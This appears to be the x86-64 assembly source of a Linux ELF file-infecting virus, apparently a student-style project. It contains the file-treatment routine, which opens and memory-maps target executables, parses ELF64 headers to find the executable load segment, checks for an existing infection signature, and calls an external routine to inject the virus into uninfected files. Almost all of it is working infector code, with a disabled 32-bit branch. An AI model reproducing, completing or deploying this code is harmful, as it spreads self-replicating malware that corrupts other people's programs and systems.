section .text
	global _treat_file
	global _final_end
	extern _update_mmaped_file
	extern _update_mmaped_file32
	extern _string
	extern _ft_strlen

;; ---------------------------------------------------
;; Get file size
;; 		int	_file_size(int fd)
;; ---------------------------------------------------
_file_size:
	enter 24, 0
	xor rax, rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, 8
	mov rsi, 0
	mov rdx, 2
	syscall
	mov QWORD [rsp], rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, QWORD [rsp]
	leave
	ret

;; ---------------------------------------------------
;; Treat file
;; 		void	treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx))
;; ---------------------------------------------------
_treat_file:
	enter 120, 0
	;; ---------------------------------------------------
	;; Stack usage
	;; ---------------------------------------------------
	;; rsp + 0 bytes for fd
	;; rsp + 8 bytes for virus size
	;; rsp + 16 bytes for file size
	;; rsp + 24 bytes for mmap return address
	;; rsp + 32 phdr
	;; rsp + 40 actual phnum
	;; rsp + 48 ehdr->e_phnum
	;; rsp + 56 supposed string of file
	;; rsp + 64 name addr
	;; rsp + 72 full_path addr
	;; rsp + 80 name len
	;; rsp + 88 full_path len
	;; rsp + 96 total len
	;; ---------------------------------------------------

	;; Check if name != NULL
	cmp rdi, 0
	je _final_end

	;; Save virus_size
	mov QWORD [rsp + 8], rsi	; save virus size
	mov QWORD [rsp + 64], rdi	; save file name
	mov QWORD [rsp + 72], rdx	; save full path
	mov rdi, QWORD [rsp + 64]	;

	;; Get file name length
	call _ft_strlen				; call to ft_strlen
	mov QWORD [rsp + 80], rax	; save file name length at [rsp+80]
	mov rdi, QWORD [rsp + 72]	; move full path into rdi

	;; Get full path length
	call _ft_strlen				; call to ft_strlen
	mov QWORD [rsp + 88], rax	; save full path length at [rsp+88]
	mov r10, rsp				; r10 = rsp
	add r10, 96					; r10 += 96
	mov r11, QWORD [rsp + 80]	; r11 = file name length
	mov QWORD [r10], r11		; *r10 = r10
	mov r11, QWORD [rsp + 88]	; r11 = full path length
	add QWORD [r10], r11		; *r10 += r11
	add QWORD [r10], 2			; *r10 += 2

	;; path
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	mov rsi, QWORD [rsp + 72]
	mov rcx, QWORD [rsp + 88]
	cld
	rep movsb

	;; path + '/'
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	add rdi, QWORD [rsp + 88]
	mov BYTE [rdi], 0x2f

	;; path + '/' + file_name
	add rdi, 1
	mov rsi, QWORD [rsp + 64]
	mov rcx, QWORD [rsp + 80]
	cld
	rep movsb
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]
	add rdi, QWORD [rsp + 88]
	add rdi, 1
	add rdi, QWORD [rsp + 80]
	mov BYTE [rdi], 0

	;; open file
	mov rdi, rsp
	sub rdi, QWORD [rsp + 96]

_lab_test:
	mov rax, 2
	mov rsi, 2
	xor rdx, rdx
	mov r10, QWORD [rsp + 96]
	sub rsp, r10
	sub rsp, 8
	mov QWORD [rsp], r10
	add QWORD [rsp], 8
	syscall
	add rsp, QWORD [rsp]
	cmp rax, -1
	jle _final_end
	mov QWORD [rsp], rax ; store the fd
	mov rdi, rax
	call _file_size
	mov QWORD [rsp + 16], rax ; store file size
	cmp rax, 64
	jl _close_file

	;; Mmap file
	mov rax, 9
	mov rdi, 0
	mov rsi, QWORD [rsp + 16]
	mov rdx, 3
	mov r10, 2
	mov r8, QWORD [rsp]
	mov r9, 0
	syscall

	;; Check mmap return
	cmp rax, 0					; if mmap <= 0
	jle _close_file				; close fd
	mov QWORD [rsp + 24], rax	; else save at [rsp+24]

;; ---------------------------------------------------
;; Find signature into file
;;
;; 	1. Find the PT_LOAD segment with execution rights (aka TEXT segment)
;; 	2. Move a the end of this segment
;; 	3. Move backwards from current offset - virus size
;; 	4. Compare by 8 the bytes from the file with our signature
;; 	5. If signature is not found update file
;; ---------------------------------------------------
;; ELF Header
;;
;;	typedef struct {
;;		unsigned char e_ident[EI_NIDENT];	16
;;		uint16_t      e_type;				2
;;		uint16_t      e_machine;			2
;;		uint32_t      e_version;			4
;;		ElfN_Addr     e_entry;				4|8
;;		ElfN_Off      e_phoff;				4|8
;;		ElfN_Off      e_shoff;				4|8
;;		uint32_t      e_flags;				4
;;		uint16_t      e_ehsize;				2
;;		uint16_t      e_phentsize;			2
;;		uint16_t      e_phnum;				2
;;		uint16_t      e_shentsize;			2
;;		uint16_t      e_shnum;				2
;;		uint16_t      e_shstrndx;			2
;;	} ElfN_Ehdr								52|64
;; ---------------------------------------------------
;; ELF Program Header
;;
;;	typedef struct {
;;		uint32_t   p_type;		4
;;		Elf32_Off  p_offset;	4
;;		Elf32_Addr p_vaddr;		4
;;		Elf32_Addr p_paddr;		4
;;		uint32_t   p_filesz;	4
;;		uint32_t   p_memsz;		4
;;		uint32_t   p_flags;		4
;;		uint32_t   p_align;		4
;;	} Elf32_Phdr;				32

;;	typedef struct {
;;		uint32_t   p_type;		4
;;		uint32_t   p_flags;		4
;;		Elf64_Off  p_offset;	8
;;		Elf64_Addr p_vaddr;		8
;;		Elf64_Addr p_paddr;		8
;;		uint64_t   p_filesz;	8
;;		uint64_t   p_memsz;		8
;;		uint64_t   p_align;		8
;;	} Elf64_Phdr;				56
;; ---------------------------------------------------

;; Check ELF header
_check_file_header:
	;; Check ELF magic number (0x7f, 'E', 'L', 'F')
	mov rdi, QWORD [rsp + 24]
	cmp DWORD [rdi], 0x464c457f
	jne _munmap

	;; Check file type (ET_EXEC)
	cmp WORD [rdi + 16], 2
	jne _munmap

	;; Check file class (EFLCLASS32)
	cmp BYTE [rdi + 4], 1
	je _parse_elf32_ehdr

	;; Check file class (EFLCLASS64)
	cmp BYTE [rdi + 4], 2
	je _parse_elf64_ehdr

	;; If not EFLCLASS32 or EFLCLASS64, munmap file
	jmp _munmap

;; Parser ELF32 header
_parse_elf32_ehdr:
	jmp _munmap
; 	;; Get ehdr->e_phoff (program header table offset)
; 	mov r10, QWORD [rsp + 24]	; mmap_base_addr
; 	mov QWORD [rsp + 32], r10	; phdr = r10
; 	add QWORD [rsp + 32], 28	; ehdr->e_phoff
; 	mov r10d, DWORD [rsp + 32]	; r10 = ehdr->e_phoff
; 	mov r10d, DWORD [r10]		; r10 = *r10
;
; 	;; if (ehdr->e_phoff >= file_size)
; 	cmp r10d, DWORD [rsp + 16]
; 	jge _munmap
;
; 	;; if (ehdr->e_phoff != 52)
; 	;; Elf32_Phdr table should be located right after Elf32_Ehdr (52 bytes)
; 	cmp r10d, 52
; 	jne _munmap
;
; 	mov DWORD [rsp + 32], r10d	; phdr = r10, save ph_offset value
; 	mov r10, QWORD [rsp + 24]	; r10 = mmap addr
; 	add DWORD [rsp + 32], r10d	; add the ph_offset to the mmap_base_address, to work on our mmaped buffer
; 	mov QWORD [rsp + 40], 0		; phnum = 0
;
; 	;; Get ehdr->e_phnum (program header table number)
; 	mov r10, QWORD [rsp + 24]	; take mmap_base_address
; 	mov QWORD [rsp + 48], r10	; move it on stack
; 	add QWORD [rsp + 48], 44	; add 44 to the mmap_base_address, it's the offset of e_phnum
; 	mov r11, QWORD [rsp + 48]	; mov this address on r11
; 	xor r10, r10				; r10 = 0
; 	mov r10w, WORD [r11]		; now we dereference our address to access the e_phnum value, and store it on r10
; 	mov QWORD [rsp + 48], r10	; save it on stack
;
; 	;; if (ehdr->e_phnum < 0)
; 	cmp r10, 0
; 	jl _munmap
;
; ;; Loop on each segment to find the TEXT segment
; _loop_elf32_phdr:
; 	;; if (phnum >= ehdr->e_phnum)
; 	mov r10, QWORD [rsp + 40]	; current phnum (starts at 0)
; 	cmp r10, QWORD [rsp + 48]	; compare phnum and ehdr->e_phnum
; 	jge _munmap
;
; 	mov r10, QWORD [rsp + 32]	; current phdr
;
; 	;; if (phdr->p_type != 1)
; 	cmp DWORD [r10], 1
; 	jne _next_elf32_phdr
;
; 	;; if ((phdr->p_flags & 1) != 1)
; 	add r10, 24					; r10 = phdr + 24 (== phdr->p_flags)
; 	mov r10d, DWORD [r10]		; r10d = *r10
; 	and r10d, 1					; r10d = r10d & 1
; 	cmp r10d, 1					; if (r10d != 1)
; 	jne _next_elf64_phdr
;
; 	;; We found the TEXT segment
; 	;; We need to go find signature offset
; 	mov r10, QWORD [rsp + 32]	; r10 = phdr
; 	add r10, 4					; r10 = phdr + 4 (== phdr->p_offset)
; 	mov r10, QWORD [r10]		; r10 = *r10
; 	mov QWORD [rsp + 56], r10	; [rsp+56] = r10
;
; 	mov r10, QWORD [rsp + 32]	; r10 = phdr
; 	add r10, 16					; r10 = phdr + 16 (== phdr->p_filesz)
; 	mov r10, QWORD [r10]		; r10 = *r10
; 	add QWORD [rsp + 56], r10	; [rsp+56] = phdr->p_offset + phdr->p_filesz
; 	mov r10, QWORD [rsp + 8]	; virus size
; 	sub QWORD [rsp + 56], r10	; [rsp+56] - virus size (supposed signature offset)
;
; 	;; Move pointer from mmap base address to signature offset
; 	cmp QWORD [rsp + 56], 0
; 	jle _call_mmaped_update
;
; 	; now we have the theoric offset of our string, we need to add this offset on the mmap address
; 	mov r10, QWORD [rsp + 24]	; mmap base address
; 	add QWORD [rsp + 56], r10	; file signature address
; 	jmp _init_cmp_loop
;
; ;; Increment phdr / phnum, and loop on next segment
; _next_elf32_phdr:
; 	add QWORD [rsp + 32], 32	; move on the the next phdr (phdr += 1)
; 	inc QWORD [rsp + 40]		; increment phnum by one (phnum++)
; 	jmp _loop_elf32_phdr		; next segment loop

;; Parse ELF64 header
_parse_elf64_ehdr:
	;; Get ehdr->e_phoff (program header table offset)
	mov r10, QWORD [rsp + 24]	; mmap_base_addr
	mov QWORD [rsp + 32], r10	; phdr = r10
	add QWORD [rsp + 32], 32	; add 32 to mmap_base_addr, it's the offset of ph_offset
	mov r10, QWORD [rsp + 32]	; r10 = phdr
	mov r10, QWORD [r10]		; take the value of ph_offset(it's like i = *i), where i is a long containing an address of a long value

	;; if (ehdr->e_phoff <= file_size)
	cmp r10, QWORD [rsp + 16]
	jge _munmap

	;; if (ehdr->e_phoff != 64)
	;; Elf64_Phdr table should be located right after Elf64_Ehdr
	cmp r10, 64
	jne _munmap

	mov QWORD [rsp + 32], r10	; phdr = r10, save ph_offset value
	mov r10, QWORD [rsp + 24]	; r10 = mmap addr
	add QWORD [rsp + 32], r10	; add the ph_offset to the mmap_base_address, to work on our mmaped buffer
	mov QWORD [rsp + 40], 0		; phnum = 0

	;; Get ehdr->e_phnum (program header table number)
	mov r10, QWORD [rsp + 24]	; take mmap_base_address
	mov QWORD [rsp + 48], r10	; move it on stack
	add QWORD [rsp + 48], 56	; add 56 to the mmap_base_address, it's the offset of e_phnum
	mov r11, QWORD [rsp + 48]	; mov this address on r11
	xor r10, r10				; r10 = 0
	mov r10w, WORD [r11]		; now we dereference our address to access the e_phnum value, and store it on r10
	mov QWORD [rsp + 48], r10	; save it on stack

	;; if (ehdr->e_phnum < 0)
	cmp r10, 0
	jl _munmap

;; Loop on each segment to find the TEXT segment
_loop_elf64_phdr:
	;; if (phnum >= ehdr->e_phnum)
	mov r10, QWORD [rsp + 40]	; current phnum (starts at 0)
	cmp r10, QWORD [rsp + 48]	; compare phnum and ehdr->e_phnum
	jge _munmap

	mov r10, QWORD [rsp + 32]	; current phdr

	;; if (phdr->p_type != 1)
	cmp DWORD [r10], 1
	jne _next_elf64_phdr

	;; if ((phdr->p_flags & 1) != 1)
	add r10, 4					; r10 = phdr + 4 (== phdr->p_flags)
	mov r10d, DWORD [r10]		; r10d = *r10
	and r10d, 1					; r10d = r10d & 1
	cmp r10d, 1					; if (r10d != 1)
	jne _next_elf64_phdr

	;; We found the TEXT segment
	;; We need to go find signature offset
	mov r10, QWORD [rsp + 32]	; r10 = phdr
	add r10, 8					; r10 = phdr + 8 (== phdr->p_offset)
	mov r10, QWORD [r10]		; r10 = *r10
	mov QWORD [rsp + 56], r10	; [rsp+56] = r10

	mov r10, QWORD [rsp + 32]	; r10 = phdr
	add r10, 32					; r10 = phdr + 32 (== phdr->p_filesz)
	mov r10, QWORD [r10]		; r10 = *r10
	add QWORD [rsp + 56], r10	; [rsp+56] = phdr->p_offset + phdr->p_filesz
	mov r10, QWORD [rsp + 8]	; virus size
	sub QWORD [rsp + 56], r10	; [rsp+56] - virus size (supposed signature offset)

	;; if our string addr is lower than the mmap addr, so we are out of the file, and this one cant hold our virus
	cmp QWORD [rsp + 56], 0
	jle _call_mmaped_update

	;; Move pointer from mmap base address to signature offset
	mov r10, QWORD [rsp + 24]	; mmap base address
	add QWORD [rsp + 56], r10	; file signature address
	jmp _init_cmp_loop

;; Increment phdr / phnum, and loop on next segment
_next_elf64_phdr:
	add QWORD [rsp + 32], 56	; move on the the next phdr (phdr += 1)
	inc QWORD [rsp + 40]		; increment phnum by one (phnum++)
	jmp _loop_elf64_phdr		; next segment loop

;; Initialize our signature compare loop
_init_cmp_loop:
	xor rcx, rcx				; clear counter register
	mov rdi, QWORD [rsp + 56]	; file signature address
	lea rsi, [rel _string]		; local signature address

;; Signature compare loop by pack of 8 bytes
;; If we successfully compare 48 matching bytes, the file has already been infected
_cmp:
	cmp rcx, 48					; if 48 (or more) matching bytes
	jge _munmap					; file already infected, unmap file
	mov r10, QWORD [rsi + rcx]	; take 8 bytes of the local signature
	cmp r10, QWORD [rdi + rcx]	; compare it to 8 bytes of the supposed file signature
	jne _call_mmaped_update		; if it differs, the file is still considered "not infected"
	add rcx, 8					; add 8 to our counter
	jmp _cmp					; loop back

;; If signature not found, update file and inject virus

_call_mmaped_update:
	;; Init argument for next function
	mov rdi, QWORD [rsp + 24]	; mmap_base_addr
	mov rsi, QWORD [rsp + 16]	; file size
	mov rdx, QWORD [rsp + 8]	; virus size
	mov r10, QWORD [rsp]		; fd
	mov r11, QWORD [rsp + 96]	; total length
	sub rsp, r11
	sub rsp, 8
	mov QWORD [rsp], r11
	add QWORD [rsp], 8
	add rsp, QWORD [rsp]
	call _update_mmaped_file

; 	;; Switch update call according to ELF class
; 	mov rax, QWORD [rsp + 24]
; 	cmp BYTE [rax + 4], 1
; 	je _call_mmaped_update32
; 	jmp _call_mmaped_update64
;
; _call_mmaped_update32:
; 	call _update_mmaped_file32
; 	jmp _end_mmaped_update
;
; _call_mmaped_update64:
; 	call _update_mmaped_file
;
; _end_mmaped_update:
; 	add rsp, QWORD [rsp]

;; Unmap file
_munmap:
	mov rax, 11
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 16]
	syscall

;; Close file
_close_file:
	mov rax, 3
	mov rdi, QWORD [rsp]
	syscall

;; End of the function
_final_end:
	leave
	ret
